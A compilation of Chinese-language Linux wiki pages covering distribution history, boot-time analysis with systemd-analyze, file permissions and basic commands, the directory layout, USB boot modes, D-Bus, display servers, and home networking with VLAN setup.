在这个阶段，一些优秀的发行版本从上述“大头”发行版本中分离出来，Linux 这个大家庭的分支越来越繁茂。1996 年，也发生了著名的“企鹅袭人”事件:）这里要提下 Jurix Linux。它：是第一个包含了脚本安装器的发行版本，是完全支持 NFS 的发行版本之一，是第一个使用 EXT2 的系统。其更重要的是，成为了 SUSE Linux 的基础系统。该阶段，基于 Red Hat 的 Linux 系统，如 Caldera，Mandrake，TurboLinux，YellowDog 和 Red Flag（红旗）出世了。Linux 内核版本也从 1.2.0 长到了 2.2 。2.0 版本内核的一些重要功能奠定了 Linux 作为 IT 行业服务器系统的基石，如支持 SMP、更好的内存管理、支持更多类型的处理器等。2.2 版本的内核对 SMP 支持进行了改进，同时也支持 了 PowerPC 架构，支持对 NTFS 的只读功能。基于 Debian 系列的发行版本，虽然不如 Red Hat 这样的对手活跃，但因在其服务器方面的易操作性也形成了自己的特色。桌面上的友好，也使 Debian 系成为人们追逐的对象。在这 5 年里，最重要的事情应该是 KDE 和 Gnome 的诞生。KDE 于 1996 年 Tübingen 大学的 Matthias Ettrich 创建，该项目不仅是编写一套常用应用，更是创建一整套桌面环境。KDE 1.0 在 1998 年发布，Mandrake 第一个采用。2000 年，2.0 发布。Miguel de Icaza 和 Federico Mena 宣布开发基于 GTK+ 的桌面环境和应用程序，也就是 Gnome 项目。据坊间传说，RedHat 成为第一个采用 Gnome 桌面环境的系统。Gnome 逐渐为人们所接受，走上快速发展之路。2000 年 5 月，Gnome 1.2 Bongo 发布。Oracle 和 Sun 公司也宣布他们的服务器官方支持 Linux 版本。

在这个 5 年，Linux 驱动的计算机数量激增，常常见诸报端。各种新应用层出不穷，更为重要的是，出现了一种 live 式的发行版本。Knoppix，由 Klaus Knopper 开发的 Debian 系发行版本，当时红极一时。它值得夸耀的就是：Knoppix 可以直接从 CD 启动。 2000 年 9 月 30 日发布的 Knoppix 1.4，可以直接插入 PC 启动。Knoppix 成为其他发行版本模仿的标杆，开始默默无闻，渐渐也有了自己的分支。很多 Linux 发行版本长得和 MS Windows 越来越像。此时，为了让人们了解 Linux 如何工作，而不是沉陷于图形界面和现成的发行版本不能自拔，LFS 项目创立了。创建者 Gerard Beekmans 写了 LFS 手册，帮助人们如何从源码一步步构建自己的 Linux 系统。2000 年，Linux 基金会成立，以便更好地保护 Linux 的自由，让其健康成长。Linux 基金会 2000 年开始赞助 Linus 的工作和社区发展，不断努力帮助 Linux 成长，坚决维护 Linux 内在的自由、合作的核心价值观。2.4 版本内核，支持 USB、PC 卡、ISA 插拔和播放，同时增加了对蓝牙、RAID 和 EXT3 的支持。2.4.x 系列版本内核是维护期最长的内核，在 2011 年以 2.4.37.11 版本结束。Red Hat 公司上市，也不断探寻更加商业化的途径。于是，RedHat 企业版本诞生，Fedora Core 成为社区发行版本。因 RHEL 开源，一些爱好者或组织也利用这些源码制作自己的发行版本，如 Cent OS、CERN、Oracle Linux 和 Scientific Linux 等。介绍下 CRUX，Crux 在别家发行版本越来越像 Windows，想要替代 Windows 时，它却独辟蹊径、特立独行，不断将自己瘦身，成为最受欢迎的最小化发行版本。它也成为 Arch Linux 的基础操作系统。2.6 版本的内核支持 PAE、新的 CPU、64 位支持改进，支持 16 TB 大小的文件系统容量，EXT4 文件系统等。虽然各种 Linux 发行版本努力保持用户和 PC 间的和谐，但于普罗大众还是有一定的距离。此时，倡导更加人性化的 Ubuntu 诞生。Ubuntu 第一个版本为 4.10，于 2004 年 10 月 20 日发布。

此时发行版本的数量爆炸式增长。虽然各种新生力量猛攻，但老版本依然宝刀不老、砥砺中坚。2006 年， Linux Mint 1.0，Ada 发布，掺杂了 FOSS 和版权软件。KDE 4.0 发布，但因缺乏稳定，饱受诟病。2009 年发布的 KDE 4.2 更加新潮美观，这让人们忘记了过去的痛苦。9 月 23 日，最最流行的 Linux 操作系统– Android 发布。在此阶段，Ubuntu 势力不断稳固，坐上了第一流行操作系统的交椅。但在 11.04 发布的 Unity 桌面环境，让人另眼相看。大家一开始几乎无一不对它产生厌恶之感，不是 Gnome 3，也不是 KDE4，生的倒也奇葩。2011 年 4 月，GNOME 3.0 发布，大家又是一片哗然。

未来，谁人能料？只拭目以待！但也请不要只做一个旁观者。今日你我所做，将是后人一壶浊酒中笑谈的历史。

标题：linux系统启动耗时分析
systemd-analyze 命令可以方便的记录系统启动耗时详情。可以通过：systemd-analyze plot > start_analyze.svg 命令来输出启动耗时的矢量图。

可以通过：systemd-analyze blame 来获得详细的进程耗时排名信息：babyfengfjx@babyfengfjx:~$ systemd-analyze blame 8.382s vmware-USBArbitrator.service 8.140s upower.service 6.655s NetworkManager-wait-online.service 5.138s man-db.service 4.477s deepin-authenticate.service 2.042s plymouth-quit-wait.service 1.222s vmware.service 1.172s udisks2.service 1.138s deepin-accounts-daemon.service 1.122s smartmontools.service

996ms apt-daily-upgrade.service 974ms logrotate.service 876ms systemd-journal-flush.service 756ms nvidia-persistenced.service 613ms user@1000.service 600ms accounts-daemon.service 600ms ModemManager.service 594ms NetworkManager.service 591ms laptop-mode.service 591ms gpu-manager.service 582ms vboxdrv.service

495ms polkit.service 477ms apparmor.service 425ms dde-filemanager-daemon.service 421ms colord.service 380ms lightdm.service 341ms systemd-modules-load.service 315ms ipwatchd.service 302ms apt-daily.service 236ms winbind.service 228ms uengine-container.service 226ms libvirt-guests.service 180ms smbd.service

systemd-analyze 命令用于记录系统启动耗时详情。可以通过'systemd-analyze plot > start_analyze.svg'命令输出启动耗时的矢量图，通过'systemd-analyze blame'获取进程启动耗时的排名信息。

标题：man帮助命令
linux中有很多命令，包括但不限于ls、cd、mv、cp、vim等。作为使用人员，不可能每个命令都熟练记住里面的参数功能和用法，这时候就需要使用man命令，格式为'man 要寻求帮助的命令名称'，以显示对应命令的帮助文档。例如，查看vim命令的帮助文档可执行'man vim'。帮助文档可能会新开一个显示页面，按Q键退出即可回到Shell界面。

标题：文件
Linux下，把各种计算机资源统一都抽象成了文件。硬件设备，套接字，普通文件，可执行程序都算是文件。内核通过文件描述符来访问文件。

对于文件，首先需要了解的，就是文件的属性。指令`ls`可以查看文件。

Linux一般将文件可读写的身份分为三个类别，拥有者（Owner），所属群组（group），其他人（others）。每个身份有对应的读（**r**ead）、写（**w**rite），执行（e**x**ecute）。

Linux有很多用户， 每个用户可以属于一个或者多个用户组。文件也是类似的。文件有创建者，以及所属群组。

和Windows下不同，Linux文件不是通过后缀名来区分可执行程序或者普通文本文件，而是通过检查文件是否有执行权限来判断是否是可执行程序。

在终端中，通过指令`ls -l`可以查看当前目录下文件的的权限。`chmod`指令可以修改文件的权限。`chown`指令可以修改文件的所有者。

标题：文件与目录
本页面介绍linux下的文件与目录管理。

文件：是存储在某种长期储存设备或临时存储设备中的一段数据流，并且归属于计算机文件系统管理之下。文件类型可分: 文本文件，是由一些字符的串行组成的。二进制文件,一般是指除了文本文件以外的文件。

文件扩展名是操作系统用来标志文类型的一种机制。注意：在Linux中，带有扩展名的文件，只能代表程序的关联，并不能说明文件是可以执行；只要属性中有运行权限，那么就表示这个文件具有可以执行的权限,但最终能否成功运行还得看文件内容。

在命名linux文件时，最好避免如下一些特殊字符：`*` `?` `<` `>` `;` `&` `!` `[` `]` `|` `\` `'` `"` `(` `)` `{` `}`。Linux中，每一个文件或目录命名最长可达255个字符，加上完整路径最长可达4096个字符。文件名字前面有.表示为隐藏文件，例如“.linux.txt”为隐藏文件。

DEB是Debian软件包格式，文件扩展名为.deb，由Debra Murdock得名（Debian创始人Ian Murdock的前妻）。Debian包是Unixar标准归档，经gzip和tar打包而成，处理工具为dpkg（常通过apt运作），可通过Alien工具转其他包格式。DEB包适用于Debian系Linux（如Linux Deepin），双击即可安装。

RPM包管理员（简称RPM，全称为The RPM Package Manager）是Linux下广泛使用的软件包管理器，最早由Red Hat研制，现由开源社区开发。RPM适用于安装RPM打包的软件，是GNU/Linux下资源最丰富的包类型，双击即可安装，仅适用于Red Hat系Linux系统。

Linux下的库有两种：静态库(.a)和共享库(.so)。静态库命名格式为libxxxx.a（xxxx为lib名称），动态库命名格式为libxxxx.so.major.minor（xxxx为lib名称，major为主版本号，minor为副版本号）。

路径：用户寻找文件历经的文件夹线路。路径分两种: 绝对路径：由根目录/写起，例如/usr/share/doc；相对路径：不由/写起，如从/usr/share/doc到/usr/share/man可写cd ../man，指相对于当前工作目录的路径。

目录：计算机系统中文件的索引（文件名与物理位置的映射），也称文件夹，是存储文件和子目录的虚拟容器，构成层次/树形结构。文件目录表目至少包含文件名、内部标识、类型、存储地址、长度、访问权限、建立时间、访问时间。

Linux下的文件名与目录严格区分大小写，例如abc.txt与abC.txt是完全不同的文件。

图形管理：用系统自带的Nautilus文件管理器实现日常文件/目录管理；用File_Roller归档管理器实现压缩、解压缩、打包管理。

cd:变换工作目录至DIR。dirName可写绝对路径（如/home/sun/downloads）或相对路径（如./downloads）；省略目录名则切换到用户home directory（登录时目录）。~表示home directory，.表示当前目录，..表示上一层目录。实例：cd /usr/bin（进入/usr/bin/）、cd ..（返回上一级）、cd -（返回上一次目录）、cd ~（进入宿主目录）。

pwd:打印当前/活动目录的绝对路径。实例：pwd（查看当前工作目录）。默认工作目录在~下，~是家目录，默认路径为/home/USERNAME。

mkdir:建立空目录。实例：mkdir <DIR>（在当前目录下创建“DIR”文件夹）。

rmdir：删除空目录，若目录不为空则报错。实例：rmdir <DIR>（移除空文件夹DIR）。

ls:显示文件和目录内容。实例：ls（列当前目录文件，不含隐含文件）、ls -a（含隐含文件）、ls -l（列文件详细信息）、ls -la（列所有文件及详细信息，含隐藏文件）。

rm:移除文件或目录。实例：rm <FILE>（删除当前目录下“FILE”文件）、rm -rf <DIR>（递归删除DIR及其中所有文件/文件夹）。

tar:打包文件。实例：tar cf FILE.tar FILES（仅打包不压缩）、tar xf FILE.tar（解包）、tar czf FILE.tar.gz FILES（打包并gzip压缩）、tar xzf FILE.tar.gz（解压缩解包）、tar cjf FILE.tar.bz2 FILES（打包并bzip压缩，文件更小）、tar xjf FILE.tar.bz2（解压缩解包）。

grep:搜索文件。实例：grep PATTERN FILES（在文件中搜特定片段）、grep -r PATTERN DIR（在文件夹中递归搜文件片段）、COMMAND | grep PATTERN（在命令输出中搜片段，如lspci | grep VGA）。

文件是存储在某种长期储存设备或临时存储设备中的一段数据流，并且归属于计算机文件系统管理之下。文件类型可分文本文件和二进制文件。文件扩展名是操作系统用来标志文件类型的一种机制，通常跟在主文件名后面，由一个分隔符分隔。Linux中扩展名主要表示程序关联，不能说明文件可执行性。命名Linux文件时应避免特殊字符如`*` `?` `<` `>` `;` `&` `!` `[` `]` `|` `\` `'` `"` `(` `)` `{` `}`，文件名长度最长可达255字符，加完整路径最长4096字符。文件名前有.表示为隐藏文件。

DEB是Debian软件包格式，扩展名为.deb。RPM全称The RPM Package Manager，是在Linux下广泛使用的软件包管理器。归档文件（压缩包）包括.zip .tar .gz等扩展名。Linux库文件分静态库(.a)和共享库(.so)，静态库名格式libxxxx.a，共享库名格式libxxxx.so.major.minor。SH是脚本文件扩展名，相当于Windows的bat批处理但更强大。

绝对路径写法由根目录/写起如/usr/share/doc。相对路径写法不由/写起，如从/usr/share/doc到/usr/share/man可用cd ../man。目录是为便于文件存取管理建立的索引系统，包含文件名和物理位置映射关系。Linux严格区分文件名大小写，如abc.txt与abC.txt不同。

cd命令变换工作目录至DIR，~表示home directory，.表示当前目录，..表示上层目录。pwd打印当前活动目录的绝对路径。mkdir建立空目录，rmdir删除空目录。ls显示文件和目录内容，-a选项包括隐含文件。cp复制文件，mv移动或重命名文件。touch更新文件时间戳或创建空文件。

more在显示器阅读文件，head显示文件开头，tail显示文件结尾。rm移除文件或目录，-rf选项递归删除。tar打包文件，czf选项打包并用gzip压缩。gzip压缩文件，-d选项解压。find查找文件，-name按文件名搜索。ln创建文件链接，-s创建软链接。grep在文件中搜索模式，-r递归搜索目录。locate从数据库查询文件，whereis定位可执行文件。

标题：文件类型
在Linux中，文件类型包括普通文件（用 '-' 表示）、目录文件（'d'）、链接文件（'l'）、设备文件（'b' 或 'c'）、套接字文件（'s'）和管道文件（'p'）。文件权限分为创建者权限、同组权限和其他权限，每个权限由读（'r'）、写（'w'）、执行（'x'）或无（'-'）表示，分别对应数字4、2、1、0。例如，权限 'rwx' 的二进制是 '111'，八进制是 '7'；'r-x' 的二进制是 '101'，八进制是 '5'。使用 ls -l 命令可以查看文件详细信息，输出包括文件类型和权限、连接个数、文件所有者、文件所在群组、文件大小（字节）、最后修改时间和文件名称。例如：'d rwx r-x r-x 2 mistyos mistyos 4096 11月 21 09:15 Desktop'。

标题：文管外设知多少
外部设备是指连在计算机主机以外的设备，它一般分为输入设备、输出设备和外存储器，外部设备是计算机系统中的重要组成部分，起到信息传输、转入和存储的作用。

输入设备主要包括 各种键盘，鼠标，笔输入设备，扫描仪（扫描设备），数码相机，数字摄像机（摄像头）等

输出设备主要包括 各种显示设备，打印设备，刻录设备（光盘刻录机）

外存储器主要包括：各种硬盘存储器，移动存储器（移动硬盘，U盘存储器，存储卡，固态硬盘，），个人手机外储存器等。

因为国家保密机制，准客户中大量使用刻录机进行文件内容交互，因此 在输出设备中，光盘刻录部分作为重点关注项目。

作为友好数据交互部分，各种移动介子衡量操作系统的重要环节，因此 在外存储器中，移动存储器部分作为重点关注项目。

根据外设用途进行分类，分类参考 百度文章 外部设备

标题：man指令
man指令的数字代号含义：1代表用户在shell环境中可以操作的指令或可执行文件，2代表系统核心可呼叫的函数与工具等，3代表一些常用的函数（function）与函式库（library），大部分为C的函式库（libc)，4代表装置文件的说明，通常在/dev下的文件，5代表配置文件或者是某些文件的格式，6代表游戏（games），7代表惯例与协议等，例如Linux文件系统，网络协议，ascii code等等的说明，8代表系统管理员可用的管理指令，9代表跟kernel有关的文件。例如查看ls命令的相关信息使用：man ls

标题：U盘
闪存盘（又称快闪随身碟、USB记忆体、优盘、U盘、电子盘、随身碟、记忆棒、手指），是一种使用USB接口连接计算机，并通常通过闪存来进行数据存储的小型便携存储设备。一般U盘体积极小、重量轻、可重复写入，面世后迅速普及并取代传统的软盘及软盘驱动器。有时读卡器也会被归类为闪存盘。这类设备的记忆芯片并不是内置的，而是可以抽换的存储卡。

目前市面上的主板都支持很多U盘的引导模式，但是有些只支持部分引导模式，U盘也并不是都可以制作成一下各种引导模式，这个与该U盘的芯片有关。遇到制作的U盘启动怕无法启动，我们可以换个引导模式制作。目前主要的引导模式有一下几种: USB-HDD、USB-ZIP、USB-HDD+、USB-ZIP+、USB-CDROM。

- USB-HDD 硬盘仿真模式，DOS启动后显示C:盘，HP U盘格式化工具制作的U盘即采用此启动模式。此模式兼容性很高，但对于一些只支持USB-ZIP模式的电脑则无法启动。

USB-ZIP是大容量软盘仿真模式，DOS启动后显示A盘，FlashBoot制作的USB-ZIP启动U盘即采用此模式。此模式在一些比较老的电脑上是唯一可选的模式，但对大部分新电脑来说兼容性不好，特别是大容量U盘。

- USB-HDD+ 增强的USB-HDD模式，DOS启动后显示C:盘.兼容性极高。其缺点在于对仅支持USB-ZIP的电脑无法启动。

- USB-ZIP+ 增强的USB-ZIP模式，支持USB-HDD/USB-ZIP双模式启动(根据电脑的不同，有些BIOS在DOS启动后可能显示C:盘，有些BIOS在DOS启动后可能显示A:盘)，从而达到很高的兼容性。其缺点在于有些支持USB-HDD的电脑会将此模式的U盘认为是USB-ZIP来启动，从而导致4GB以上大容量U盘的兼容性有所降低。

- USB-CDROM 光盘仿真模式，DOS启动后可以不占盘符，兼容性一般。其优点在于可以像光盘一样进行XP/2003安装。制作时一般需要具体U盘型号/批号所对应的量产工具来制作，对于U3盘网上有通用的量产工具。

系统无法识别U盘。此类现象常见于用户使用dd命令将iso文件写入U盘。linux会将这样的u盘识别为光盘，所以不会自动挂载，并且提示出现归递分区，彻底解决方法需要格式化u盘。

标题：一切皆文件的思想
每个人都知道文件是什么...就是我们平常看到的图片,文档或者音乐等. 程序本质上来说也是文件, 只不过只有机器能读懂罢了. 事实上, 整个Linux操作系统就是一大堆的文件合集...但是, 有一部分很奇怪, 不仅仅是你下载到电脑里面的数字图片是文件, 连你的监视器也是文件! 你知道吗, 在Linux一切皆文件! WOW!!!这是怎么做到的? 我们来探索一下吧.

在这个目录下你会看到很多黄体黑边的名称. 他们都是你的系统正在使用或可以使用的设备名. 每一个都被看做是Linux中的一个文件, 就像是一个硬盘一样作为一个文件放在那里. 如果你要使用一个IDE硬件驱动(比如SCSI, 释义见附录1), 你的硬件驱动将会被识别成 /dev/hda  千万不要删除它, 因为你的硬盘会旋转, 从你的电脑里跳出来, 落在地板上, 溅满了泥土. 哈! 逗你玩的. 通常情况下你不会进到 /dev 目录里面的, 因此不需要担心. 译者注: 现阶段的操作系统在 /dev 目录下识别出的设备会自动挂载到其他目录, 然后就可以使用了, 这里解释的是核心原理

cd /boot   # 然后按换行 接下来你将进入 /boot 目录. 你不会在那里找到任何靴子,鞋子或任何种类的脚上穿的东西. 因为那地方通常放的是Linux的内核文件. 超级用户或许会出于各种私人原因而修改内核的位置(比如 /shoe ), 但是通常情况下常见的Linux发行版内核都放在这里. 将来的某个时刻你很可能不得不使用这个目录, 因为你或许想使用两个或多个不同类型的内核. 这将在更加高级的课程中讨论.

如果你不是root用户, 同时你通过命令 `cd /root` 进入了此目录内. 但是进入后你什么都做不了. root用户的家目录是所有其他用户的禁区. Linux的反应有点像"你不必知道". 用户的主目录对其他用户也有一定的限制.

/sbin 也是那些禁区目录其中之一. 你可以看, 但不能创建新的文件. 这个目录就好像 /bin 目录一样, 总是被正在使用的程序频繁访问, 区别在于这里的只允许被root用户使用. `shutdown` 命令的原文件也在这里. 只有root用户可以关闭系统. 如果是非root用户尝试关闭系统, 他或她将收到一个消息, 消息大致内容是只有root用户可以这么做.然后那个人将被秘密警察跟踪三个月.

/tmp 目录被用来存储临时文件, 就像是名字说明的那样. 当你使用Linux的窗口管理器比如KDE的时候, 这个窗口管理器运行期间生成的临时文件都将写入这个目录下. 当你双击一个图片图标的时候, 图片被查看器打开, 在你查看的同时一个临时文件也被自动生成到 /tmp 目录. 当你关闭图片查看器软件的时候, 临时文件也会被删除. 这表明管理器软件临时使用了此目录.

/var目录主要放一些文件目录和名称固定, 但是文件大小总是改变的文件. 比如, 这里有一些好的Linux数据库. 一个被叫做MySQL, 通常情况下, MySQL会维持他的数据在固定子目录下比如 /var/mysql/ 目录下. 如果我有一个电子商务网站, 我需要一个数据库记录注册购买信息. 那个数据库文件的大小很明显将不断扩大. 如果没有扩大, 那我的网站很可能出问题了. /var 目录也同样可以放置邮件服务收发邮件的内容. 同样的, 邮件大小也各不相同.

/lib是库文件(library)目录. 这也是它名称的由来. 程序在运行过程中, 很可能使用库文件来执行他们的方法. 不同的程序使用相同的通用公共库, 因此Linux将它们都放到这里, 这样每个程序都可以找到. 你不需要关系这个目录里面的内容, 除非当你执行程序的时候出现提醒"找不到库文件...". 这种情况可能发生在当你下载完一个新程序后, 你必须从源文件编译. 即使如此, 遇见这种依赖问题也是相当罕见的情况. 大多数程序即使是从源文件编译, 通常有一个预配置程序, 此程序将确保自己可以找到程序运行所必须的库文件. 如果他们没有提供, 他们至少也会提醒你无法安装此程序.

/home 目录存储了用户的私人文件. 我们每个人都有使用程序的特定偏好. 这些偏好设置通常被包含在配置文件里面, 并保存在用户的家目录里面. 这些文件名大多数使用点开头(代表隐藏文件, 比如 .cache ) 如果你进入你的家目录:  # 假如你的用户名为 Tom cd /home/Tom ls -a  # 假如你的用户名为 Jerry cd /home/Jerry ls -a 你将会看到那些文件

大多数Linux安装版会提供如下目录: /mnt /cdrom /floppy 他们应该都是空目录. 译者注: /mnt 是存储挂载设备的目录 /cdrom 是光盘的临时挂载点 /floppy 是软驱的临时挂载点 还有一种目录结构: /mnt/cdrom /mnt/floppy

SCSI 小型计算机系统接口（SCSI，Small Computer System Interface）是一种用于计算机及其周边设备之间, 硬盘、软驱、光驱、打印机、扫描仪等

标题：什么是dbus
DBUS是一种高级的进程间通信机制，主要用于进程间函数调用以及进程间信号广播。一般来说，dbus会提供Methods，Properties和Signals。- Methods 函数调用：DBUS可以实现进程间函数调用，进程A发送函数调用的请求（Methodcall消息），经过总线转发至进程B。进程B将应答函数返回值（Method return消息）或者错误消息（Error消息）。- Properties 属性：Dbus可以设置相关属性，当某个属性发生变化，dbus会往下发一个signal通知其属性改变。- Signal 消息广播：进程间消息广播（Signal消息）不需要响应，接收方需要向总线注册感兴趣的消息类型，当总线接收到“Signal消息”类型的消息时，会将消息转发至希望接收的进程。

标题：图形服务器
图形服务器是显示服务器或窗口服务器是一个程序，其主要任务是协调客户的输入和输出，并从操作系统，硬件，以及彼此的其余部分。显示服务器与其客户端在显示服务器协议的通信协议，其可以是网络透明的或简单网络能够进行通信。显示服务器中的任何图形用户界面，特别是窗口系统的关键部件。

[X Window System](https://wiki.deepin.org/index.php?title=X_Window_System)：影响重大的X Server简介。[Wayland](https://wiki.deepin.org/index.php?title=Wayland)：X Server的替代者Wayland简介。

标题：家庭网络配置
很多人也许会玩电脑，但是对网络是不太清楚的。在我大学的时候，也是如此，但是为了能够共享上网，所以我们还是学会了一个叫做网关的概念。如果是普通家庭，电信工作人员帮你配置好光猫，自己简单连一个路由器，基本上也能保证正常上网了，所以可能对网络的拓扑结构其实也是一知半解。在什么时候可能需要一定的网络知识，那就是家庭的物理拓扑达到一定规模的时候，就如我们上学的时候，有8台电脑需要上网，所以我们才接触到网关的概念。所以如果你以前不清楚相关的概念，也是情有可原。不过网络通信其实挺有趣，不妨可以学习一下。

两台电脑怎么可以通信？只需要链接一根网线，然后设置 ip 地址，即可。ip 地址是一种网络协议下的通信地址，它有如下形式： 192.168.0.1。它有逗号分隔的4组数字，从0~255之间。这些数字不是瞎填，全世界那么多网络设备，就靠这个ip地址来定位，所以有相关的世界性规范来分配地址。而家庭网络属于局域网，一般是192.168.x.x 网段。ip 地址是有网络和主机的概念的，只有处于同一个网络的主机，才能相互通信。如 192.168.1.100， 192.168.1 是一个网络， 后面的 100 是主机标识。是不是所有网络都是前三组数字？并不是，它是通过一个叫掩码的东西决定的，形式类似 255.255.255.0 ，这数字有点看不懂，其实要看它的二进制，在电脑中就是1111...0000 这种，经过位运算“与”，就会保留前面三组数字，后面一组清零。

也就是掩码可以决定网络占多少位，主机占多少位，可能有一些分段占 2 组，甚至占了2.5 组这种。但这些是细节，以 192.168.x.y 这种经常使用的局域网网段来说，一般可以把x 看作自己定义的网络（192.168定死了）， y 看作主机。主机的 0 和 255 有特殊用途，不要使用。因为 ip 地址的以上特性，所以严格来说，唯一标识一个地址应该提供 ip 地址和它的掩码，表示成 192.168.1.1/255.255.255.0 或者等价的 192.168.1.1/24 （前24个二进制位为网络，0~255占的二进制位就是 8 位） ，但是日常交流中，常见的网段一般会忽略掉掩码。

电脑和电脑一对一，端口有限，如果三个电脑怎么相互链接？要买个新往网卡嘛？这样链接的复杂度会是 n 的 2 次方。这时可以使用一个叫交换机的独立设备。你可以把交换机看作一个实现端口间两两连接的设备。只需要将原本插入到另一个电脑的网线，插在交换机的任意端口上即可。

192.168.0.1 要访问 192.168.1.1 怎么办？这种跨网络的访问需要一个中介。中介拥有两个网口， 一个处于 192.168.0 网络（如主机号 2）， 一个处于 192.168.1（如主机号 5）。这个中介配置了转发功能，相当于桥梁的作用（网桥）。然后 192.168.0.1 这个主机，就可以这样配置网关： 192.168.0.2。如果 192.168.1.1 也想访问 192.168.0.1 ,那么它可以配置网关： 192.168.1.5。总之就是网关在自己网络中的 ip 地址。现实设备中，网关由路由器实现，它同时也是一台交换机，只是一般只有一个 wan 口，连接上级设备，有 n 个 lan 口，连接本地网络，这部分也相当于本地的交换机。

路由器这种设计，它主要是为了让wan口链接外网，也就是上级电信网络的服务器。一般只有一条网线到户，所以不需要那么多 wan 口。路由器 wan 口连接的叫上级网络，lan 口连接的到本地网络，路由器会自动将 lan 口对外访问转发到 wan 口，但是不会自动将 wan 口访问 lan 口进行转发。所以这两类接口还是有区别的。当然如果想实现两个网络自由连接，那你可以再增加一台反向的路由器。（或者稍微复杂一点，通过配置 wan 口到 lan 口的自定义转发）和交换机不同的点，交换机是只相当于添加多个网口，减少连线。而网关则相当于一台智能的电脑，它拥有两个端口（两个ip），链接两个网络，自己具备转发功能。

很多时候，我们的设备上网，从来就没有设置什么 ip 地址，为什么也能上网？这就是有一个 dhcp 服务器，给本地网络提供了自动分配地址的功能。这个 dhcp 功能一般也集成到路由器中，相当于一个服务，可以开启关闭。

我们上网，并不使用 ip 地址，而是使用网址。但实际上网址首先得翻译成 ip 地址，才能实现通信。而将 ip 和 网址一一对应，并提供翻译服务的服务器，就叫 DNS 服务器。 dhcp 服务器一般也会将正确的 dns 服务器的地址配置好。如果没有配置 dns 服务器，那么本地主机会将网关视为 dns 服务器，由网关向上级网络提交 dns 翻译请求。注意 dns 不是路由器的功能，而只是一个配置项。dns 服务器一般设置在电信，因为路由器的 wan 口通过电信服务器的 dhcp 获取了 ip / dns 的配置信息，所以它可以将这些信息再通过自身的 dhcp 服务给本地网络做配置。当然你也可以自己设置电脑的 dns 配置，来忽略上级的配置。

有时候电信的 dns 服务器抽风，就会打开网页上不了网，但是 QQ 等一些网络应用却能用，这时候你可以更换一个第三方的 dns 服务器配置，如阿里巴巴的公共 dns 服务器： 223.5.5.5 ，也许就能解决问题了。

路由器和上级电信服务器，很多时候并不是通过通常的 dhcp 分配ip 手段来实现链接的。因为电信他要帐号，他要收你的钱，所以就有一个验证的过程。总而言之，就有个拨号的过程，只有拨号成功了，你才能获得公网的 ip 地址，才能访问外网（可以将外网看作一个超大的网络，主机容量数以亿计）。你不能天真的认为，可以通过自己设置一个外网 ip 来达到上述效果，但公网上的网关不会认可你瞎搞的设置，会直接屏蔽掉你的物理链路。拨号技术有很多种，常见的有 pppoe。路由器一般带有拨号功能，当然你也可以用自己的电脑来拨号，只是这样能上网的就只有拨号的那台电脑。

电信一般会给你提供一台光猫，光猫本身也是路由器，但性能比较弱，端口比较少，所以下面一般会再接自己的路由器。光猫和普通路由器的区别，它的 wan 口是连接光纤的，具备将光信号转换成电信号的能力，具备这种能力也叫调制解调器，也就是所谓的 modem（音译猫）的来由。

wifi 是一种无线链接上网的方式，提供 wifi 功能的设备叫 ap，一般路由器会带 ap 功能，但是也会有独立的 ap。 可见 wifi 是只一种连接形态，相当于一个无形的网线（端口）。从网络功能上它类似交换机。不过因为路由器也集成了 ap 功能，所以可能会导致有些人觉得 ap 具备路由功能（也就是联通两个网段）。你可以将路由的 wifi 理解为连接到 lan 口上的一台交换机。比如你手机 wifi 上网，如果你电脑连接到 lan 口，那么手机和电脑处于同一个网络（当然需要配置好ip）。

当然你把电脑连接到 wan 口，那么电脑和手机就处于不同网络。不过这是路由提供的功能，而不是ap提供的功能。要明确的是这点。独立的 ap 设备比较小众，所以很贵，如果要将路由作为纯 ap 使用，一般需要关闭路由的 dhcp 等路由自带的服务（不屏蔽可能会和上级路由提供类似功能产生冲突），然后上级网络连接到 lan 口即可。有一些路由器支持 ap 模式，或者桥接模式，这时候的 wan 口会转变成 lan 口，失去转发功能。如果你有多级路由器（路由器下面再连路由器），这样多层转发会带来一定的性能损耗，同时如果你的设备不是都在一个路由器下，那么他们就不处于同一个网络，不能直接访问，这时候也可以设置桥接模式让所有设备处于同一个网络。

vlan 是虚拟 lan 口的意思，它的作用就是让一个端口，具备多个逻辑 lan 口的功能，也就是所谓的单线复用。现实生活中，我们的网线布线因为种种原因，可能少了，后期也不好加，那么就想办法通过一个端口来实现多个端口的效果。vlan 在网络技术栈中，属于二层，路由属于上层（三层）。它属于交换机这种设备，但是并不是所有交换机都配置这个功能。这是属于比较专业的设置，很多家用设备可能没有。这点需要用户注意的。

端口 vlan ： 这类 vlan 是将 lan 口（比如5个）分组，比如一组2个是一个 vlan 网络，一组3个是另一个 vlan 网络，实现隔离。802.1Q vlan: 这类 vlan 技术对数据帧进行修改，添加 vlan 标识（如vlan 3)，对应端口收到数据帧，对其进行识别，无效的丢弃，属于自己的保留。也就是各个端口要在同一个 vlan 网络，只需要配置相同的 vlan id 即可。

这里重点放在 802.1Q vlan，讲解它的相关配置细节：1. PVID : 即 prot vlan id（端口 vlan id）2. unTagged: 去标签（可以标记多个 id）3. Tagged: 标签（可以标记多个id）。端口可以配置 id， 并且有两个可配置属性，去标签，和 标签 端口，同时会遇到 vlan 数据帧和非 vlan 数据帧（非vlan 数据帧是没打过标签的原始数据，这里记作 lan帧）。

首先每个端口都会有一个 pvid，每一个端口都是自己 id 的去标签端口。所谓去标签端口是针对外部 lan帧 来说的，当原始 Lan 帧通过端口 1 进入交换机，那么会打上内部交流的 vlan 1，同理，从端口1 出去的任何数据，必然要去除 vlan 1 来还原成原始 lan 数据，这样才被终端正确识别。去标签的名词就是这样来的。当端口只配置一个去标签id，这类口也叫 Access （存取）口。

如果去标签标记多个id会怎样？它就允许对多个不同id的帧进行去除。而和标记不匹配的将会丢弃。打标签口类似，但它不会去标签，而是保留 vlan 帧，但 vlan帧不被终端设备识别，所以这类端口的用途是连接下一个交换机。这类口也叫 trunk（主干）口。总结：1. pvid 给所有进入交换机的 lan 帧打上标签2. unTagged 给指定的id（自动加上当前pvid）去除标记 1. 单个 id 表示连接到最终设备（如电脑）3. Tagged 允许指定的id 的 vlan 帧通过。4. pvid只有一个，但是可以同时具备 unTagged 和 Tagged，并支持对他们配置多个关联 id。

虽然 vlan 这套技术很复杂，有点绕晕的感觉，但是其实和我们之前表达的内容差不多。标记相同 vlan 在同一个网络。细节是怎么去标记，这里用的是 pvid 标记入口，用 unTagged 标记出口，用 tagged 标记内部流通。

